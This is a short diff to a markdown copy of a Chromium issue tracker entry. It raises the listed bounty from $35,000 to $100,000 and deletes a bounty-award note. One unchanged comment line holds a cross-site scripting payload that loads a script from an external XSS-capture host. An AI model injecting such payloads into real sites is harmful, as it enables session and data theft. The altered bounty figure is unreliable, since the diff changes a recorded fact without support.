@@ -11,7 +11,7 @@
 | **Reporter** | so...@gmail.com |
 | **Assignee** | st...@microsoft.com |
 | **Created** | 2025-09-23 |
-| **Bounty** | $35,000.00 |
+| **Bounty** | $100,000.00 |
 
 ## Description
 
@@ -1622,10 +1622,6 @@ great
 ### ke...@gmail.com (2026-01-03)
 
 '"><script src=https://xss.report/c/ketanindori></script>
-
-## Bounty Award
-
-> High-quality report of demonstrated memory corruption in non-sandboxed process
 
 ---
 *Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/446722008)*
